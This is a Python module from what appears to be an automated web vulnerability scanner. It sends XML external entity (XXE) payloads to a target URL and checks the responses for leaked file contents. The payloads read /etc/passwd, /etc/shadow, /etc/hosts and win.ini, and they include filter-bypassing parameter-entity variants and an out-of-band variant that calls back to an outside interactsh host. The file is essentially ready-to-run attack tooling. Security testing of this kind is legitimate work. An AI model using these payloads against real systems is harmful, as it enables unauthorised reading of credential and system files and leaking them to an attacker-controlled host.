from core.http import fetch

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
    '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><doc>&xxe;</doc>',
    # Parameter entity (bypasses some filters)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>',
    # Error-based XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/shadow"> %xxe; %xxe2;]><foo/>',
    # SOAP XXE
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><root>&test;</root></soap:Body></soap:Envelope>',
]

REFLECTED_MARKERS = ["root:x:", "127.0.0.1", "[extensions]", "/etc/passwd", "localhost", "daemon:", "/bin/bash", "[boot loader]"]


def generate_tasks(url, config):
    tasks = []
    oast_url = config.get("_oast_url")  # injected by orchestrator if interactsh is live

    for payload in XXE_PAYLOADS:
        tasks.append({
            "url": url,
            "method": "POST",
            "data": payload,
            "headers": {"Content-Type": "application/xml"},
            "type": "XXE",
            "executor": test_xxe,
        })
        # Try JSON-to-XML content type switching
        tasks.append({
            "url": url,
            "method": "POST",
            "data": payload,
            "headers": {"Content-Type": "application/json"},
            "type": "XXE",
            "executor": test_xxe,
        })

    # OOB XXE — external entity points to interactsh callback
    if oast_url:
        oob_payload = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{oast_url}">]><root>&xxe;</root>'
        tasks.append({
            "url": url,
            "method": "POST",
            "data": oob_payload,
            "headers": {"Content-Type": "application/xml"},
            "type": "XXE",
            "oob": True,
            "executor": test_xxe,
        })

    return tasks


async def test_xxe(session, task):
    try:
        text, resp = await fetch(session, task["url"], method="POST", data=task["data"], headers=task["headers"])
        if resp and text:
            lower = text.lower()
            vulnerable = any(marker.lower() in lower for marker in REFLECTED_MARKERS)
            return {
                "type": "XXE",
                "url": task["url"],
                "oob": task.get("oob", False),
                "vulnerable": vulnerable,
                "response": text[:1000],
            }
    except Exception as exc:
        return {"type": "XXE", "url": task["url"], "error": str(exc), "vulnerable": False}
    return {"type": "XXE", "url": task["url"], "vulnerable": False}